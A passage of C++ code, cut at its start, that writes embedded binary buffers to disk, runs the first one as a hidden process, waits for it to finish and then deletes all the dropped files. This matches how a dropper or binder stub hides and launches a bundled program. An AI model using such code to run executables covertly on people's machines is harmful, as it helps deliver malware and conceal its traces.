	
	for (unsigned int i = 0; i < data.size(); ++i)
	{
		outFile.open(path + "\\" + fileNames[i], std::ios::out | std::ios::binary);
		outFile.write(reinterpret_cast<const char*>(data[i]), sizes[i]);
		outFile.close();
	}
	
	std::string currentPath{path};
	currentPath.append("\\" + fileNames[0]);
	STARTUPINFOA si{ 0 };
	PROCESS_INFORMATION pi{ 0 };
	si.wShowWindow = SW_HIDE;
	CreateProcessA(currentPath.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	if (cleanupThread)
	{
		while (WAIT_TIMEOUT == WaitForSingleObject(pi.hProcess, 5000));
		
		for (auto& file : fileNames)
		{
			currentPath = path + "\\" + file;
			std::filesystem::remove_all(currentPath);
		}
	}
	
	return 0;
}